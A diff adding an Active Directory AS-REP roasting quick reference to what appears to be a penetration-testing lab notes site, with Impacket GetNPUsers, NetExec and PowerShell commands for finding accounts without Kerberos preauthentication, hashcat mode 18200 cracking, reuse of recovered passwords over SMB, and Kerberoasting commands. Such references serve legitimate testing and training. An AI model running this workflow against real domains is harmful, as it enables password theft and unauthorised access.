@@ -7,6 +7,105 @@ keywords: ["as-rep roasting", "asrep", "getnpusers", "preauthentication", "kerbe
 
 {/* Generated from Active Directory/Reference/AS-REP Roasting Quick Reference.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Verify the preauthentication condition first
+
+AS-REP roasting concerns accounts for which Kerberos preauthentication is not required. It is a different branch from requesting service tickets for SPN-bearing accounts. You need a valid domain/DC context and candidate usernames; you do not need to assume that every existing account has this setting.
+
+### Discover the account setting with authenticated enumeration
+
+```powershell
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth,Enabled,Description
+```
+
+Record the identity and account state. Where authenticated LDAP enumeration is unavailable, a scoped username list can test the condition directly.
+
+### Request the artifact and preserve output
+
+```bash
+impacket-GetNPUsers 'DOMAIN_FQDN/' -dc-ip DC_IP \
+  -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
+
+nxc ldap DC_FQDN -d DOMAIN_FQDN -u USERNAME -p 'PASSWORD' --asreproast asrep.hash
+```
+
+These are alternative workflows, not a requirement to run both. Distinguish an unknown principal, an account requiring preauthentication, an account-state restriction, and a network/KDC error. Keep the output lines that identify which account produced which artifact.
+
+### Use the matching offline format
+
+```bash
+head -n 2 asrep.hash
+# For the corresponding $krb5asrep$23$ format:
+hashcat -m 18200 asrep.hash WORDLIST
+hashcat -m 18200 asrep.hash --show
+```
+
+Confirm the actual artifact prefix before selecting the mode. Preserve the username/domain metadata and delimiters; copying only a fragment can make the input unparsable.
+
+### Turn recovery into a verified lead
+
+```bash
+nxc smb TARGET_IP -d DOMAIN_FQDN -u RECOVERED_USERNAME -p 'RECOVERED_PASSWORD' --shares
+```
+
+One successful login establishes a particular identity on a particular service. Continue with membership, share and ACL enumeration. A low-privilege account can still be useful for directory queries, but recovery alone is not domain compromise.
+
+If a request or offline attempt fails, check the DC/domain, candidate spelling, account status, artifact format and selected mode. Do not convert a timeout into a conclusion about the preauthentication setting.
+
+## GetNPUsers.py: choose the operation and read the result
+
+Check accounts without Kerberos preauthentication.
+
+### What the result establishes
+
+A returned AS-REP artifact identifies an account for which the requested preauthentication condition applied.
+
+### Prerequisites and common failures
+
+Unknown users, accounts requiring preauthentication, and connectivity errors are distinct; the artifact requires its matching offline cracking format.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+impacket-GetNPUsers 'DOMAIN/' -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
+```
+
+### Example 2: AS-REP Roasting: Quick Reference
+
+Run in: **Saved lab example**.
+
+```bash
+# Linux (Impacket) — with a userlist (no creds) or authenticated
+GetNPUsers.py $DOMAIN/ -dc-ip $DC -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
+GetNPUsers.py $DOMAIN/USER:PASS -dc-ip $DC -request         # authenticated: find them all
+nxc ldap $DC -u USER -p PASS --asreproast asrep.hash
+```
+
+Saved context: [AS-REP Roasting: Quick Reference — AS-REP Roasting: Quick Reference](/active-directory/asrep-roasting). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Kerberos / Spns
+
+Run in: **Saved lab example**.
+
+```bash
+GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+    # Find user accounts with registered SPNs
+
+GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request
+    # Request TGS tickets for Kerberoasting
+
+GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass
+    # Find accounts vulnerable to AS-REP roasting
+
+GetNPUsers.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+    # Query for AS-REP roastable accounts using credentials
+```
+
+Saved context: [Active Directory Enumeration Commands — Kerberos / Spns](/active-directory/command-reference#kerberos-/-spns). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Existing notes and worked examples
+
 Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
 Accounts with **"Do not require Kerberos pre-authentication"** set will return an AS-REP encrypted with the user's password hash — no creds needed to request it.
